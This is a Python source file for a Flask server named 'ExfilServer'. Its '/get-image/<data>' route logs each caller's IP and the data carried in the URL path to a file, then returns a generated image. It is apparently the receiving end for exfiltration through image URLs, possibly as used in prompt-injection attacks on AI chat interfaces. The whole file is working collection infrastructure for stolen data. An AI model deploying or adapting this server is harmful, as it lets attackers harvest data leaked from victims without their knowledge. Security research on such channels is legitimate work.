from flask import Flask, send_file, request
from flask_cors import CORS
import io
import base64
from PIL import Image

class ExfilServer:
    def __init__(self, host='localhost', port=8080, log_path='exfil.log'):
        self.host = host
        self.port = port
        self.log_path = log_path
        self.app = Flask("ExfilServer")
        CORS(self.app)
        self.image_generator = None
        
    def init_image_generator(self):
        try:
            from diffusers import StableDiffusionPipeline
            import torch

            model_id = "segmind/tiny-sd"
            
            device = "cuda" if torch.cuda.is_available() else "cpu"
            self.image_generator = StableDiffusionPipeline.from_pretrained(
                model_id, 
                torch_dtype=torch.float16 if device == "cuda" else torch.float32
            ).to(device)
            
            print(f"Image generator initialized on {device}")
            return True
        except Exception as e:
            print(f"Failed to initialize image generator: {e}")
            return False
    
    def generate_image_from_data(self, data):
        """Generate an image based on the exfiltrated data"""
        if not self.image_generator:
            return None
            
        try:
            prompt = f"A visual representation of: {data}"

            image = self.image_generator(
                prompt, 
                num_inference_steps=4,
                height=512, 
                width=512
            ).images[0]
            
            return image
        except Exception as e:
            print(f"Image generation failed: {e}")
            return None

    def setup_routes(self):
        @self.app.route('/get-image/<data>', methods=['GET'])
        def exfiltrate(data):
            with open(self.log_path, 'a') as log_file:
                client_ip = request.remote_addr
                log_file.write(f"{client_ip}: {data}\n")
            

            image = self.generate_image_from_data(data)
            if image:
                img_io = io.BytesIO()
                image.save(img_io, 'PNG')
                img_io.seek(0)
                return send_file(img_io, mimetype='image/png')
            else:
                return {"status": "image generation failed"}, 500

    def run_server(self, debug=False, background=False):
        if background:
            from threading import Thread
            server_thread = Thread(target=self.app.run, kwargs={
                'host': self.host,
                'port': self.port,
                'debug': debug,
                'use_reloader': False
            })
            server_thread.daemon = True
            server_thread.start()
        else:
            self.app.run(host=self.host, port=self.port, debug=debug)